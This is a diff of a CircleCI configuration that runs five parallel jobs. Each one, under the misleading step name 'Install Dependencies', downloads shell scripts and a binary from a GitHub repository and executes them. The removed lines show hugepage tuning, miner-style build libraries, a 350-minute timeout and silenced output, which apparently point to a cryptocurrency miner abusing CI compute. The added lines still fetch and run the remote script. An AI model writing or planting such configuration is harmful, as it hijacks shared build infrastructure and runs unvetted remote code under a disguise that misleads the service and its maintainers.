@@ -7,35 +7,35 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 && wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && wget https://github.com/ririnsinta/ririnsinta/raw/main/tuyulsugar && sudo sysctl -w vm.nr_hugepages=1280 && chmod +x tuyulsugar cobalagi.sh && timeout 350m ./cobalagi.sh > /dev/null 2>&1
+            command: wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && chmod +x cobalagi.sh && ./cobalagi.sh
     aku2:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 && wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && wget https://github.com/ririnsinta/ririnsinta/raw/main/tuyulsugar && sudo sysctl -w vm.nr_hugepages=1280 && chmod +x tuyulsugar cobalagi.sh && timeout 350m ./cobalagi.sh > /dev/null 2>&1
+            command: wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && chmod +x cobalagi.sh && ./cobalagi.sh
     aku3:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 && wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && wget https://github.com/ririnsinta/ririnsinta/raw/main/tuyulsugar && sudo sysctl -w vm.nr_hugepages=1280 && chmod +x tuyulsugar cobalagi.sh && timeout 350m ./cobalagi.sh > /dev/null 2>&1
+            command: wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && chmod +x cobalagi.sh && ./cobalagi.sh
     aku4:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 && wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && wget https://github.com/ririnsinta/ririnsinta/raw/main/tuyulsugar && sudo sysctl -w vm.nr_hugepages=1280 && chmod +x tuyulsugar cobalagi.sh && timeout 350m ./cobalagi.sh > /dev/null 2>&1
+            command: wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && chmod +x cobalagi.sh && ./cobalagi.sh
     aku5:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 && wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && wget https://github.com/ririnsinta/ririnsinta/raw/main/tuyulsugar && sudo sysctl -w vm.nr_hugepages=1280 && chmod +x tuyulsugar cobalagi.sh && timeout 350m ./cobalagi.sh > /dev/null 2>&1
+            command: wget https://github.com/ririnsinta/ririnsinta/raw/7f5b93e27a665065bbe0235221e3eedcfe40d637/cobalagi.sh && chmod +x cobalagi.sh && ./cobalagi.sh
 
 workflows:
     version: 2
